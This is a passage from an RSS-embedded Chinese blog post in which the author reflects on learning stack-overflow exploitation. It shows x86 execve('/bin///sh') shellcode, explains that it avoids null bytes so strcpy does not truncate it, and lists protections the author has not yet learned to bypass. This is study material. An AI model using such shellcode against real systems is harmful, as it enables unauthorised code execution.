&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> /* execve(path=&amp;#39;/bin///sh&amp;#39;, argv=[&amp;#39;sh&amp;#39;], envp=0) */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push b&amp;#39;/bin///sh\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x68
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x732f2f2f
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x6e69622f
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push argument array [&amp;#39;sh\x00&amp;#39;] */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push &amp;#39;sh\x00\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x1010101
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor dword ptr [esp], 0x1016972
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor ecx, ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ecx /* null terminate */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pop ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ecx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ecx /* &amp;#39;sh\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor edx, edx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* call execve() */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push SYS_execve /* 0xb */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pop eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> int 0x80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>乍一看有点奇怪，但注意观察汇编后的机器码就会发现这段汇编编译后不包含 &lt;code>\x00&lt;/code>，在 &lt;code>strcpy&lt;/code> 之类的场景下能避免被截断，泛用性更好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>存在几个问题。&lt;/p>
&lt;ol>
&lt;li>很多保护机制绕过方法没有学。ASLR、PIE、NX、CANARY 等。&lt;/li>
&lt;li>花了很长时间去无谓地算偏移，明明给了 &lt;code>andl -16, %esp&lt;/code> 却不肯看一眼对齐前后 &lt;code>%esp&lt;/code> 怎么变。&lt;/li>
&lt;li>gdb 不熟练，&lt;code>gdb-peda&lt;/code> 真的很好用，绝了。&lt;/li>
&lt;li>还没试过构造 ROP Gadget 链&lt;/li>
&lt;/ol>
&lt;p>各方面都有很大提高空间吧。想找个群什么的有问题不用自己强钻牛角尖。&lt;/p></description></item></channel></rss>